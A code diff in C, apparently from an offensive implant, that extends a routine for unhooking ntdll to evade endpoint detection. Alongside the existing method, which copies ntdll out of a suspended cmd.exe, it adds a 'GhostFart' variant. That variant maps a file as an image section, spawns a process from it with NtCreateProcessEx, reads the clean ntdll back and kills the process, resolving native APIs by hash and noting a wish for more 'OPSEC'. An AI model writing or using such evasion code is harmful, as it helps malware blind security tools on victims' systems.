@@ -368,7 +368,7 @@ INT FindLastSysCall(CHAR* pMem, DWORD size) {
 }
 
 static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
-#if CONFIG_UNHOOK == TRUE
+#if CONFIG_UNHOOK >= 1
 
     // Set up local variables
     DWORD oldProtect = 0;
@@ -451,7 +451,7 @@ LEAVE:
 }
 
 static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked){
-#if CONFIG_UNHOOK == TRUE
+#if CONFIG_UNHOOK >= 1
 
     // Set up local variables
     DWORD oldProtect = 0;
@@ -537,7 +537,7 @@ static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked){
 VOID HookingManager(INT UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_size){
 // TODO IMPLEMENT GHOSTFART INSTEAD OF PERUN'S FART & MORE OPSEC HERE
 
-#if CONFIG_UNHOOK == TRUE
+#if CONFIG_UNHOOK >= 1
 
     SIZE_T bytesRead = 0;
 
@@ -545,22 +545,90 @@ VOID HookingManager(INT UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_siz
         // Get clean copy of ntdll
         STARTUPINFOA si = { 0 };
         PROCESS_INFORMATION pi = { 0 };
+        HANDLE hFile = NULL;
+        HANDLE hSection = NULL;
+        HANDLE hProc = NULL;
+        PRTL_USER_PROCESS_PARAMETERS proc_params = NULL;
 
+#if CONFIG_UNHOOK == 1 // PeRun's Fart
         check_debug(CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE,\
             CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
                                    NULL,
                                    "C:\\Windows\\System32\\",
                                    &si,
                                    &pi) != 0, "CreateProcessA Failed!");
+#elif CONFIG_UNHOOK == 2 // GhostFart
 
+        // Init locals
+        OBJECT_ATTRIBUTES obj_attrs;
+        IO_STATUS_BLOCK io_status_block;
+
+        // Generate image path
+        UNICODE_STRING nt_image_path;
+        RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlInitUnicodeString_CRC32B);
+        p_RtlInitUnicodeString(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\WEB.rs");
+
+        // Init objectAttribs
+        InitializeObjectAttributes(&obj_attrs, &nt_image_path, 0x00000040L, NULL, NULL);
+
+        // Open File
+        NtOpenFile_t p_NtOpenFile = GetProcAddressByHash(Instance.Handles.NtdllHandle, NtOpenFile_CRC32B);
+
+        check_debug(p_NtOpenFile(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ,
+            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) == 0,
+            "NtOpenFile Failed!");
+
+        // Create Section
+        NtCreateSection_t p_NtCreateSection = GetProcAddressByHash(Instance.Handles.NtdllHandle, NtCreateSection_CRC32B);
+        check_debug(p_NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile) == 0,
+            "NtCreateSection Failed!");
+
+
+        // Create the process parameters
+        RtlCreateProcessParametersEx_t p_RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlCreateProcessParametersEx_CRC32B);
+        check_debug(p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path,
+            NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
+            0x01) == 0, "RtlCreateProcessParametersEx Failed!");
+
+        PS_CREATE_INFO create_info = { 0 };
+        create_info.Size = sizeof(create_info);
+        create_info.State = PsCreateInitialState;
+
+        NtCreateProcessEx_t p_NtCreateProcessEx = (NtCreateProcessEx_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, NtCreateProcessEx_CRC32B);
+
+        check_debug(p_NtCreateProcessEx(&pi.hProcess, PROCESS_ALL_ACCESS, NULL, (HANDLE)-1, HANDLE_FLAG_INHERIT, hSection, NULL, NULL, 0) == 0, "NtCreateProcessEx Failed!");
+#endif
         check_debug(ReadProcessMemory(pi.hProcess, p_ntdll, pCache, ntdll_size, &bytesRead) != 0, "ReadProcessMemory Failed!");
         UnHookNtdll(p_ntdll, pCache);
 
         LEAVE:
-            // Kill sacrificial process
-            if(pi.hProcess != NULL){
+        // Kill sacrificial process
+        if(hFile != NULL){
+            CloseHandle(hFile);
+        }
+
+        if(hSection != NULL) {
+            CloseHandle(hSection);
+        }
+
+        if(pi.hProcess != NULL){
+            if(hSection != NULL){
+                NtTerminateProcess_t p_NtTerminateProcess = (NtTerminateProcess_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, NtTerminateProcess_CRC32B);
+                p_NtTerminateProcess(pi.hProcess, 0x0);
+
+            }else{
                 TerminateProcess(pi.hProcess, 0);
             }
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+
+
+        }
+
+        if(proc_params != NULL){
+            RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(Instance.Handles.NtdllHandle, RtlDestroyProcessParameters_CRC32B);
+            p_RtlDestroyProcessParameters(proc_params);
+        }
 
     }else if (UnHook == 1){
         // check if we already got a clean copy in memory
@@ -574,4 +642,6 @@ VOID HookingManager(INT UnHook, LPVOID pCache, HMODULE p_ntdll, SIZE_T ntdll_siz
 
     __asm("nop");
 #endif
+
+
 }
